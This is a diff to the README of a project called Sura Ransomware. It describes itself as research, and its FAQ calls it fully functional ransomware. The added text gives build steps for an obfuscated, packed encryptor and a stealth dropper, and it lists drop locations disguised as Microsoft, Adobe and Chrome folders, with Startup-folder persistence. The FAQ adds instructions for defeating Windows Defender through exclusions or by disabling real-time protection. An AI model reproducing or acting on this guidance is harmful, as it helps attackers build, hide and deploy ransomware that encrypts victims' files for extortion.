@@ -67,30 +67,46 @@ Sura Ransomware is an advanced security research project demonstrating state-of-
 
 ## 🚀 Quick Start
 
-**TL;DR - Just run `Build.bat` and it will automatically build everything for you.**
+**TL;DR - Just run `Build.bat` as Administrator and it will automatically build everything for you.**
 
 ```powershell
 # Clone the repository
 git clone https://github.com/Suraware/Suraware.git
 cd Suraware
 
-# Run the automated build script
+# Run the automated build script (RIGHT-CLICK → Run as Administrator)
 .\Build.bat
 ```
 
 That's it! The build script will:
-- Download all Go dependencies
-- Build the Builder tool
-- Generate encryption keys
-- Compile all components (Encryptor, Decryptor, Dropper)
-- Output ready-to-use executables
+1. Restore original source files from `.original` backups
+2. Run Python polymorphic obfuscator on source code
+3. Generate ECIES encryption keypair
+4. Build crypter components (Stub + Crypter)
+5. Compile the Encryptor with embedded public key
+6. Pack the Encryptor with AES-256 encryption
+7. Build the stealth Dropper (optional)
+8. Compile the Decryptor with embedded private key
 
-**Output files:**
-- `Sura-Dropper.exe` - Main executable (use this one)
-- `Decryptor-Built.exe` - Decryption tool for recovery
-- `private_key.pem` - Keep this secret for decryption
+**Output files in `dist/` folder:**
+- `dist/Sura-Built.exe` - Raw compiled encryptor
+- `dist/Sura-Packed.exe` - Packed with crypter (use this)
+- `dist/Sura-Dropper.exe` - Stealth dropper wrapper (if built successfully)
+- `dist/Decryptor-Built.exe` - Decryption tool for recovery
 
-**Note:** This repository is no longer maintained. Feel free to fork and modify for your own research purposes.
+**Important Notes:**
+- ⚠️ **Run as Administrator** - Required for Windows Defender exclusions and file permissions
+- 🔑 **Save the keys** - Private key is printed in console and embedded in Decryptor
+- 📁 **All output goes to `dist/` folder** - No scattered executables
+- 🐍 **Python required** - For source code obfuscation (optional but recommended)
+
+**Build System Changes (v2.1):**
+- ✅ Removed complex temp directory methods that caused build failures
+- ✅ Simplified direct builds to `dist/` folder
+- ✅ Improved Crypter with fallback temp location if direct write fails
+- ✅ Decryptor build simplified (no evasion needed)
+- ✅ Dropper now optional (build continues even if it fails)
+- ✅ Better error messages for debugging
 
 ---
 
@@ -638,7 +654,7 @@ for i := 0; i < 50; i++ {
 
 ### Dropper Architecture
 
-**Why Multi-Stage?**
+**Why Multi-Stage? (Optional Enhancement)**
 
 Windows Defender blocks `go build` when compiling ransomware because:
 - ChaCha20 import + file traversal = ransomware heuristic
@@ -659,6 +675,15 @@ Stage 2 (Payload) - ENCRYPTED
 - Never touches disk as plaintext
 - Executes directly from memory
 ```
+
+**Note:** The dropper build may fail on some systems due to Go build environment issues. If this happens, the build process will continue and you can use `dist/Sura-Packed.exe` directly - it's already packed and encrypted.
+
+**Drop Locations:** The dropper now uses more sophisticated locations:
+- `%LOCALAPPDATA%\Microsoft\Windows\WinX`
+- `%LOCALAPPDATA%\Microsoft\Edge\User Data`
+- `%LOCALAPPDATA%\Adobe\Acrobat\DC`
+- `%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup` (persistence)
+- `%LOCALAPPDATA%\Google\Chrome\User Data\SwReporter`
 
 **Dropper Code Structure:**
 
@@ -827,7 +852,23 @@ A: Yes, this is fully functional ransomware with strong encryption. It's designe
 A: No. ChaCha20 and ECIES are cryptographically secure. Without the private key, decryption is mathematically impossible.
 
 **Q: Why does Windows Defender block the build?**  
-A: Defender uses heuristic detection. When Go compiles ChaCha20 + file traversal, it matches ransomware patterns. The dropper architecture solves this.
+A: Defender uses heuristic detection. When Go compiles ChaCha20 + file traversal, it matches ransomware patterns. **Solution:** Run Build.bat as Administrator to add Defender exclusions, or temporarily disable Real-time Protection.
+
+**Q: Build fails with "Access is denied" when packing?**  
+A: Windows Defender is blocking the packed executable write. **Solutions:**
+1. Run Build.bat as Administrator (recommended)
+2. Temporarily disable Real-time Protection
+3. Add folder exclusion: Settings → Virus & Threat Protection → Exclusions → Add this folder
+4. The Crypter now has a fallback to write to temp directory - check there if direct write fails
+
+**Q: Dropper build fails - is this normal?**  
+A: Yes, the dropper build may fail due to Go build environment issues. This is fine - the build system will continue and you can use `dist/Sura-Packed.exe` directly, which is already packed and encrypted.
+
+**Q: Build fails with temp directory errors?**  
+A: This has been fixed in v2.1. The build system now builds directly to the `dist/` folder instead of using complex temp directory methods.
+
+**Q: Where are the output files?**  
+A: All executables are in the `dist/` folder: `Sura-Built.exe` (raw), `Sura-Packed.exe` (packed), `Sura-Dropper.exe` (optional), and `Decryptor-Built.exe` (decryption tool).
 
 **Q: Will antivirus detect the dropper?**  
 A: The dropper should compile cleanly because it contains no ransomware code. However, signatures may eventually be added after public release.
